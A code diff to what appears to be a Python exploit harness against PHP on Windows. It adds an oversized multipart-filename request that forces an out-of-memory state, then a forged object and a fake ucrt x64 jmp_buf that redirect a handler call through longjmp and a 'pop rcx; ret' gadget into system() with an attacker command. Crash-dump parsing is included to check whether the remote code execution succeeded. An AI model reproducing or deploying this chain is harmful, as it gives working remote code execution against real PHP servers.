@@ -91,6 +91,24 @@ def build_probe_pad(padlen=2528):
     pad[1936:1940] = p32(0x106)                 # IS_STRING
     return bytes(pad)
 
+def build_arm(size_bytes):
+    '''Multipart arm: huge filename -> rfc1867 pre-RINIT OOM (in-band fatal, php alive).'''
+    name = b'a' * size_bytes
+    part = b'--x\r\nContent-Disposition: name=a; filename="' + name + b'"\r\n\r\n'
+    return part + b'data\r\n--x--\r\n'
+
+def control_body():
+    return b'--x\r\nContent-Disposition: name=a; filename="c"\r\n\r\ndata\r\n--x--\r\n'
+
+def precond_legacy(host, port):
+    '''v5: replicate the CI-matrix request sequence that produced WORKER_DEATH on
+    7.4.33/8.0.30 (run 40059664526): multipart control -> multipart arm -> multipart
+    control, THEN the urlencoded shape. Replayed identically before probe and fire.'''
+    mp = 'multipart/form-data; boundary=x'
+    for tag, body in (('ctl', control_body()), ('arm', build_arm(1800000)), ('ctl2', control_body())):
+        r = http_post(host, port, body, mp)
+        print(f'P2S_PRE {tag} resp={r.get("status")} body_len={r.get("body_len")} err={r.get("error")}')
+
 def build_rce_pad(padlen, PAD, LONGJMP, SYSTEM, POPRCX, cmd):
     pad = bytearray(padlen)
     fo = PAD + 2056
@@ -100,11 +118,16 @@ def build_rce_pad(padlen, PAD, LONGJMP, SYSTEM, POPRCX, cmd):
     pad[2056:2060] = p32(1)                      # gc.refcount
     pad[2060:2064] = p32(0x108)                  # gc.type_info
     pad[2064:2068] = p32(0)                      # handle
-    pad[2072:2080] = p64(0)                      # ce
-    pad[2080:2088] = p64(PAD + 2000)             # handlers
-    pad[2008:2016] = p64(LONGJMP)                # handlers->free_obj (handlers+8)
-    pad[2088:2096] = p64(PAD + 2352)             # jmp_buf rsp @ fo+32
-    pad[2096:2104] = p64(POPRCX)                 # jmp_buf rip @ fo+40
+    # v5 REAL ucrt x64 jmp_buf (RE from live dump): {cookie@0, rbx@8, RSP@0x10, rbp@0x18,
+    # rsi@0x20, rdi@0x28, r12-15@0x30-0x48, RIP@0x50, mxcsr@0x58}; longjmp does cmp [env+0],0
+    # (r10=0 CET-off). cookie=gc.refcount: GC_DELREF 1->0 right before dtor -> check passes.
+    pad[2072:2080] = p64(PAD + 2352)             # env[2] RSP @ fo+0x10 (also object->ce; short-circuit OR never deref's it)
+    pad[2080:2088] = p64(PAD + 2000)             # env[3] rbp @ fo+0x18 (ALSO handlers ptr, read BEFORE dtor)
+    pad[2008:2016] = p64(LONGJMP)                # handlers->dtor_obj (handlers+8) -> longjmp(env=fo)
+    pad[2088:2096] = p64(PAD + 2352)             # env[4] rsi (legacy rsp slot, harmless)
+    pad[2096:2104] = p64(POPRCX)                 # env[5] rdi (legacy rip slot, harmless)
+    pad[2136:2144] = p64(POPRCX)                 # env[10] RIP @ fo+0x50 -> pop rcx; ret  (v4 crash: was 0 -> jmp NULL)
+    pad[2144:2148] = p32(0x1F80)                 # env[0x58] mxcsr: default, all FP exceptions masked
     pad[2352:2360] = p64(PAD + 2400)             # fake stack: popped -> rcx = &cmd
     pad[2360:2368] = p64(SYSTEM)                 # ret -> system(rcx)
     pad[2368:2376] = p64(0)                       # system returns -> crash (receipt already on disk)
@@ -310,13 +333,15 @@ def start_php(php_exe, host, port, docroot, ini, log):
                          stdout=lf, stderr=lf)
     return p
 
-def write_ini(php_dir, stage, mem_limit):
+def write_ini(php_dir, stage, mem_limit, legacy=False):
     val = f'{mem_limit}M' if isinstance(mem_limit, int) else str(mem_limit)
     tag = val.replace(' ', '')
     ini = os.path.join(php_dir, 'php_p2s_%s.ini' % tag)
+    extra = 'session.upload_progress.enabled=1\nlog_errors=1\n' if legacy else ''
+    pms = '32M' if legacy else '1G'   # CI-matrix ini used post_max_size=32M
     with open(ini, 'w') as f:
-        f.write(f'memory_limit={val}\npost_max_size=1G\ndisplay_errors=On\n'
-                f'display_startup_errors=On\nerror_log={stage}\\php_err.log\n')
+        f.write(f'memory_limit={val}\npost_max_size={pms}\ndisplay_errors=On\n'
+                f'display_startup_errors=On\nerror_log={stage}\\php_err.log\n' + extra)
     return ini
 
 def wait_dump(dumpdirs, deadline_s=150, exclude=None):
@@ -408,6 +433,8 @@ def main():
     cd = os.path.join(os.environ.get('LOCALAPPDATA', ''), 'CrashDumps')
     if os.path.isdir(cd):
         crash_dirs.append(cd)
+    legacy = tuple(int(x) for x in a.version.split('.')[:2]) < (8, 1)   # 7.4.x / 8.0.x: CI-replication path
+    print(f'P2S_MODE legacy={legacy}')
 
     # ---- ladder -------------------------------------------------------------
     ladder_log = []
@@ -418,7 +445,7 @@ def main():
             p_cur.kill()
         except Exception:
             pass
-        ini = write_ini(a.php_dir, stage, sh[5])
+        ini = write_ini(a.php_dir, stage, sh[5], legacy)
         p_cur = start_php(php_exe, a.host, a.port, docroot, ini, log)
         if not wait_port(a.host, a.port, p_cur):
             tail = open(log, 'rb').read()[-500:].decode('latin-1', 'replace') if os.path.exists(log) else ''
@@ -430,6 +457,8 @@ def main():
             print(f'P2S_LADDER attempt={si} shape={shape_name(sh)} control={ctl["status"]}')
             ladder_log.append({'attempt': si, 'shape': sh, 'control': ctl['status']})
             continue
+        if legacy:
+            precond_legacy(a.host, a.port)
         body = build_body(build_probe_pad(sh[3]), memshift=sh[0], k1=sh[1], k2=sh[2], xlen=sh[4])
         pr = http_post(a.host, a.port, body, 'application/x-www-form-urlencoded')
         btxt = pr.get('body', b'')[:300].decode('latin-1', 'replace')
@@ -542,7 +571,7 @@ def main():
         p_cur.kill()
     except Exception:
         pass
-    ini = write_ini(a.php_dir, stage, win_shape[5])
+    ini = write_ini(a.php_dir, stage, win_shape[5], legacy)
     p2 = None
     for port_backoff in range(4):
         p2 = start_php(php_exe, a.host, a.port, docroot, ini, log)
@@ -555,6 +584,11 @@ def main():
         return 11
     ctl2 = http_get(a.host, a.port)
     print(f'P2S_STAGE_FIRE control2 status={ctl2["status"]} body={ctl2["body"][:80]!r}')
+    if legacy:
+        precond_legacy(a.host, a.port)
+    # v5: fresh crash watcher — the first one exits after the probe dump; we want the FIRE crash dump too
+    pd_proc2 = procdump_start(stage, a.dump_dir)
+    print(f'P2S_FIRE_WATCHER pid={pd_proc2.pid if pd_proc2 else None}')
 
     # ---- v4: live dump of the fire target -> DLL bases from THIS process ----
     try:
@@ -626,6 +660,19 @@ def main():
     rc = p2.poll()
     print(f'P2S_STAGE_FIRE php_exit={rc} marker=MISSING')
     res['rce'] = 'FAIL'
+    fdump = wait_dump(a.dump_dir, deadline_s=40, exclude=pre_dumps | {dump})
+    if fdump:
+        try:
+            fmd = parse_minidump(fdump)
+            fex = fmd.get('exc') or {}
+            print('P2S_FIRE_CRASH dump=%s rip=%#x rcx=%#x rsp=%#x p1=%s pad_hits=%d'
+                  % (fdump, fex.get('rip', 0), fex.get('rcx', 0), fex.get('rsp', 0),
+                     [hex(p) for p in (fex.get('params') or [])], len(fmd.get('pad_hits', []))))
+            res['fire_exc'] = fex
+            res['fire_pad_hits'] = fmd.get('pad_hits', [])[:4]
+            res['fire_dump'] = fdump
+        except Exception as exc:
+            print(f'P2S_FIRE_CRASH parse=FAIL {exc}')
     try:
         p2.kill()
     except Exception:
